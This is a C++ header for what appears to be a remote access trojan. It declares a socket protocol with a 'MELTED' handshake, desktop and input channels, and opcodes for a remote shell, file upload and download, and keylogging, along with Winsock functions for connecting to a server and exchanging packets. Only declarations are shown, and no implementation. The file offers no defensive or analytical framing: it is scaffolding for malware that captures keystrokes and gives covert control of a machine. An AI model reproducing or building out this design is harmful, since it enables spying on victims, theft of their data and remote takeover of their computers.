#pragma once

#include <string>
#include <vector>
#include <winsock2.h>  
static const unsigned char gc_magik[] = { 'M','E','L','T','E','D', 0 };

enum Connection : int
{
    desktop = 0,
    input   = 1
};

enum : int
{
    OP_SHELL_START  = 200,
    OP_SHELL_STOP   = 201,
    OP_SHELL_CMD    = 202,
    OP_SHELL_OUTPUT = 203,
    OP_FILE_LIST       = 210,
    OP_FILE_LISTRES    = 211,
    OP_FILE_DOWNLOAD   = 212,
    OP_FILE_UPLOAD     = 213,
    OP_FILE_DATA       = 214,
    OP_FILE_DONE       = 215,
    OP_KEY_START    = 220,
    OP_KEY_STOP     = 221,
    OP_KEY_DATA     = 222
};

struct PacketHeader
{
    int opcode;
    int dataSize;
};

bool InitWinSock();
SOCKET ConnectToServer(const std::string& ip, int port);
bool SendAll(SOCKET s, const char* buf, int totalSize);
bool RecvAll(SOCKET s, char* buf, int totalSize);
int  SendInt(SOCKET s, int val);
int  RecvInt(SOCKET s, int &val);
bool SendHandshake(SOCKET s, Connection c);
bool SendPacket(SOCKET s, int opcode, const void* data, int dataSize);
bool RecvPacket(SOCKET s, PacketHeader &hdr, std::vector<char> &outData);
